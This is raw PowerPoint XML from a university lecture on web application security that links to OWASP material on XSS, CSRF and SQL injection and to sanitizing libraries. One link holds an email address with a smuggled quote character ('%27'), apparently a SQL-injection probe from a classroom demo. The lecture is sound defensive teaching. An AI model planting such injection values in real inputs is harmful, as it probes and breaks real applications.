<file path=ppt/slides/_rels/slide1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https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide1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6.jpg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image17.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide1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2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https://www.npmjs.com/package/sanitize" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image18.jpg"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide2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https://angular.io/api/platform-browser/DomSanitizer" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide2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2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.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide2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2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9.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide2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2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0.jpg"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide2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2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3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https://github.com/valexandersaulys/tiny-csrf" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://angular.io/guide/http-security-xsrf-protection" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide3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
</file>

<file path=ppt/slides/_rels/slide3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3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3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mailto:%27luigi@webtech-sh.op" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide3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mailto:luigi@webtech-sh.op" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:%27luigi@webtech-sh.op" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image22.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide3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https://xkcd.com/327" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image23.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide3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3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
</file>

<file path=ppt/slides/_rels/slide3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4.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image25.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image26.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image27.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image28.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image29.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide4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4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4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0.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image31.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide4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0.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image31.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image32.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image33.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide4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4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4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4.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide4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http://store.webtech.com/cat/index.html" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://store.webtech.com/pages/about.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://store.webtech.com/img/logo.png" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://store.webtech.com:81/dir/page.html" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://course.webtech.com/cat/index.html" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image35.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide4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http://localhost:3001/cors.html" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image36.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3001/" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide4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7.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3001/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000/" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide5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5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http://localhost:3001/" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide5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8.jpg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000/data" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3001/" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide5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https://owasp.org/www-community/attacks/xss/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://xss-game.appspot.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-community/attacks/csrf" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-community/attacks/SQL_Injection" TargetMode="External"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide5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https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikibooks.org/wiki/Web_Application_Security_Guide" TargetMode="Externa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962050" y="2230958"/>
            <a:ext cx="7174865" cy="1763395"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="116205" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12700" marR="5080">
              <a:lnSpc>
                <a:spcPts val="6480"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="915"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="6000" spc="-85" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="6000" spc="-340" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="6000" spc="-110" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>APPLICATION </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="6000" spc="-365" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>SECURITY</a:t>
            </a:r>
            <a:endParaRPr sz="6000">
              <a:latin typeface="Tahoma"/>
              <a:cs typeface="Tahoma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961136" y="4469918"/>
            <a:ext cx="4638040" cy="1601470"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="181610" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="13335">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1430"/>
              </a:spcBef>
            </a:pP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Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>PhD</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="12700" marR="5080">
              <a:lnSpc>
                <a:spcPct val="119100"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="425"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="1700" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>luigiliberolucio.starace@unina.it</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1700" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="1700" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://luistar.github.io</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1700" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="1700" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.docenti.unina.it/luigiliberolucio.starace</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri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962050" y="589821"/>
            <a:ext cx="6421120" cy="822325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="4000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315"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-55" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>UNIVERSITÀ </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>DEGLI</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-55" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-60" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>STUDI</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-40" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-55" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>DI</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-50" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>NAPOLI</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-65" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-75" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>FEDERICO</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-60" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-280" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:endParaRPr sz="20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295"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-75" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>TECHNO</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="396C77"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>L</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>OGIES</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-35" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-105" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>LECTURE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-50" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:endParaRPr sz="28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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld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60"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-185"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t>APPLICATION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-175"/>
              <a:t>SECURITY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962050" y="1446872"/>
            <a:ext cx="10156825" cy="3608704"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="98425" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="775"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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Apps</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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play</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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crucial</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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role</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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modern</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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business</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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communication</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="692785" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1060"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Securing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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them</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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essential</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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prevent</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>unauthorized</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>access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,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>breaches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,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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other</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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activities.</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="994"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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Security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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refers</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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measures</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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practices</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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implemented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	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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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protect</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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applications</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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threats.</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="99060" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="950"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
